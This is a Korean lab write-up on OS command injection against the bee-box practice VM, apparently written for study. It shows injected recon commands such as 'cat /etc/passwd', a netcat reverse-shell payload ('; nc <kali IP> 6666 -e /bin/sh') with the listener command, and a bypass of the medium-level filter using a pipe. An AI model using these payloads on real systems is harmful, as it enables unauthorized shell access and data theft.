## OS Command Injection

![chrome_kwMsmrvtf8](https://user-images.githubusercontent.com/79683414/133914877-de34a754-78b9-4a71-a1d6-3853a07dbceb.png)

시스템 명령어를 주입해서 서버에 접근하는 공격이다. 시스템 명령어를 웹 어플리케이션에서 실행 할 수 있을 때 발생한다.

아래와 같이 `nslookup`과 같은 시스템 명령이 이용될 것이라 추측되는 Input에 CLI 의 다중명령어 기능을 활용하면 추가적인 명령어를 삽입할 수 있다.

> __다중명령어__
>
> - 세미콜론(;) : 하나의 명령어 라인에서 여러 명령어를 실행. 실패와 관계 없이 전부 실행
>
> - 엠퍼센트(&) : 앞에서 부터 순차적으로 실행하되, 실패할 경우 뒤 명령은 수행하지 않음.
>
> - 파이프라인(|): 앞에 나온 명령 결과를 두 번째 명령에서 사용.
>
>   ex)
>
>    ls -l ; cd /var/www/html
>
>   dpkg -l | grep python



## Dns lookup

Dns lookup 은 Dns 주소를 IP로 변환 해주는 기능이다. `www.naver.com` 을 입력했을 때, 네이버의 실제 공인 IP 주소가 출력된다.

![vmware_RIbLqdwE1L](https://user-images.githubusercontent.com/79683414/133915239-cfd47faa-d0b5-4e5b-9bc8-699e203b80dd.png)

<br/>

<br/>

### low

'bee-box : OS Command Injection' 에서는 Dns lookup 기능이 구현되어 있다. `nslookup`과 같은 OS Command로 구현되는 것 같은데, 몇 가지 명령어를 테스트 해보자. 우선 정보 수집을 위한 간단한 명령어를 테스트해보자.

whoami, hostname, cat /etc/passwd, cat /etc/issue 등

![chrome_MSsvmX1b2H](https://user-images.githubusercontent.com/79683414/133948251-b7763cd2-0bff-4900-bb67-8bebc05d8a71.png)

<br/>

<br/>

<br/>

OS Command Injection 을 막기 위한 보안 기능이 없는 듯 하다. `cat /etc/passwd` 로 사용자 목록을 출력해보자. 위에서 출력된 www-data의 사용자 정보를 확인 할 수 있다.

![chrome_fOnrQaWRiY](https://user-images.githubusercontent.com/79683414/133948435-d193fb34-21fd-454f-904e-cfeef365cb51.png)

<br/>

<br/>

<br/>

이 취약점이 발견되면 "리버스 쉘"을 이용하여 간단히 쉘을 획득 할 수 있다는 점이 재밌었다. 쉘을 획득하는 방법은 바인드/리버스 쉘 두 가지 방법이 있는데, 리버스를 이용하는 것이 일반적이다.

리버스 쉘을 이용하는 이유는 방화벽 때문인데, 방화벽은 들어오는 패킷에 대해서는 제한적이고 나가는 패킷에 대해서는 느슨하기 때문이다. 마치 실생활에서 사용되는 도어락 처럼, 도어락은 집에 들어오기 위해 비밀번호를 입력하여 인증하는 절차를 거치지만 집에서 나갈 때 별도로 인증 절차를 수행하지 않는다.

> - Bind shell : 피해자 쪽 서버 포트가 열렸을 때 공격자가 대상 포트에 접속함.
> - Reverse shell : 공격자 쪽 서버 포트를 열어놓고 피해자가 접속.

<br/>

<br/>

<br/>리버스 쉘을 이용하여 웹쉘을 획득해보자.

<br/>

<br/>

<br/>

우선 공격자(kali)에서 `nc -nlvp 6666` 으로 포트를 listening 상태로 열어둔다. 포트는 사용하지 않는 임의의 포트를 입력한다.

![vmware_lmjG6sKjOI](https://user-images.githubusercontent.com/79683414/133949853-6cc9e333-7c37-4806-a2d7-5091dfabee96.png)

<br/>

<br/>

<br/>

위에서 발견한 OS Command Injection 을 사용하여 Bee-box 에서 Kali 로 nc 명령을 날린다. `-e` 옵션은 연결된 후 해당 프로그램을 실행한다는 의미이다. 

`; nc <kali IP address> 6666 -e /bin/sh`

![chrome_IWimdFKx8Z](https://user-images.githubusercontent.com/79683414/133950018-6c14a827-f68a-499b-9f89-17669c9b90ef.png)

<br/>

<br/>

<br/>

Bee-box 에서 `Lookup` 버튼을 누르면 Kali(공격자)의 화면에 connect 되었다고 출력된다.

앞에서 실행 한 Command Injection 명령어를 통해 쉘이 정상적으로 획득되었는지 확인해보자.

![vmware_XOif4ug8NM](https://user-images.githubusercontent.com/79683414/133950251-d5275ec0-af32-4217-9f85-9c5d28a3beea.png)



Bee-box(희생자)의 쉘을 획득했다. 쉘을 획득하면 정보 수집은 물론, 권한 상승 공격으로 Root 권한을 획득 할 수 있다.

## medium/high

![nEFT3XuK6p](https://user-images.githubusercontent.com/79683414/133951089-035c5b8e-257f-49ba-bd5e-cee432e16835.png)

`commandi.php`를 확인해 보면 medium과 high 단계에는 각각 필터링이 적용되어 있는데

`commandi_check_1`과 `commandi_check_2` 이다.

<br/>

<br/>

<br/>

![Code_LlCWXF3l3r](https://user-images.githubusercontent.com/79683414/133951161-5da40ddf-0739-42c2-8c5b-8aacb182b288.png)

medium 단계에 적용된 check_1 는 "&" 와 ";"를 필터링 하므로, "|"을 이용해 공격이 가능하다.

high 단계에 적용된 escapeshellcmd() 함수는 쉘 메타문자(" `&#;`|*?~<>^()[]{}$\`, `\x0A`\xFF")에 백슬래쉬 "\\"를 붙여 명령을 실행할 수 없도록 한다.

> __escapeshellcmd()__ : https://www.php.net/manual/en/function.escapeshellcmd.php

